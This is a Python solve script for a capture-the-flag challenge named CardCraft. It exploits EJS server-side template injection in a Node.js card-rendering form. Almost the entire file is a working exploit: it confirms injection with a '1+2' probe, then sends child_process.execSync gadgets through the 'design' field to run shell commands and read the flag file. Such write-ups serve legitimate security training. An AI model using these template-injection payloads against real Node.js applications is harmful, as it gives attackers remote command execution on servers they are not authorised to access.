#!/usr/bin/env python3
"""
CardCraft (inj, 200) — CWE-94 EJS (Node.js) SSTI -> RCE.

The `design` field is a user-supplied EJS template. <%= 1+2 %> -> 3 proves
execution; process.getBuiltinModule('child_process').execSync(cmd) runs commands.

Usage:
    python3 solve.py                          # defaults to inj6.chal.deti:8045
    python3 solve.py http://inj6.chal.deti:8045
"""
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://inj6.chal.deti:8045"
FLAG_RE = re.compile(r"flag\{[^}]*\}")


def render(design: str) -> str:
    return requests.post(f"{BASE}/card",
                         data={"recipient": "x", "message": "y", "design": design},
                         timeout=10).text


def rce(cmd: str) -> str:
    for gadget in (f"process.getBuiltinModule('child_process').execSync('{cmd}')",
                   f"process.mainModule.require('child_process').execSync('{cmd}')"):
        out = render(f"<%= {gadget} %>")
        if FLAG_RE.search(out):
            return out
    return out


def main() -> int:
    if "3" not in render("<%= 1+2 %>"):
        print("[-] no EJS SSTI")
        return 1
    print("[i] EJS SSTI confirmed (1+2 -> 3)")
    m = FLAG_RE.search(rce("cat /flag/flag"))
    print(f"[+] FLAG: {m.group(0)}" if m else "[-] no flag; try ls -la /flag /app via rce()")
    return 0 if m else 1


if __name__ == "__main__":
    raise SystemExit(main())
